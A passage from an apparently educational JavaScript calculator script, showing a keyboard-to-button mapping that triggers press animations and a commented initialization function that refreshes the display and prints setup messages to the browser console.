  // Normalize the key to our data-value format
  const valueMap = {
    'Enter': '=',
    'Escape': 'C',
    '*': '*',
    '/': '/',
  };
  const targetValue = valueMap[key] ?? key;

  // Query ONLY within the button grid (not the whole document)
  const matchingBtn = buttonGrid.querySelector(
    `[data-value="${CSS.escape(targetValue)}"]`
  );

  if (matchingBtn) {
    triggerPressAnimation(matchingBtn);
  }
}


/* ════════════════════════════════════════════════════════════════════
   §9. INITIALIZATION
   ──────────────────────────────────────────────────────────────────
   An IIFE (Immediately Invoked Function Expression) runs once as the
   script loads. Using a function scope prevents any variables inside
   from polluting the global scope.

   Syntax: (function() { ... })()
     The outer parentheses make it a function EXPRESSION (not a
     declaration), and the trailing () immediately invokes it.
════════════════════════════════════════════════════════════════════ */
(function init() {
  // Sync the display with the initial empty state
  updateDisplay();

  // Developer-friendly console output to confirm setup
  console.group('%c🧮 Grid Calculator — Initialized', 'color:#f59e0b; font-weight:bold; font-size:13px');
  console.log('%c✅ Single event listener attached to #button-grid', 'color:#4ade80');
  console.log('%c✅ Custom recursive descent parser ready', 'color:#4ade80');
  console.log('%c✅ Keyboard shortcuts active (0-9, +, -, *, /, Enter, Esc, Backspace)', 'color:#4ade80');
  console.log('%c📖 Lessons: Event Delegation | String Manipulation | Custom Parser', 'color:#818cf8');
  console.groupEnd();
})();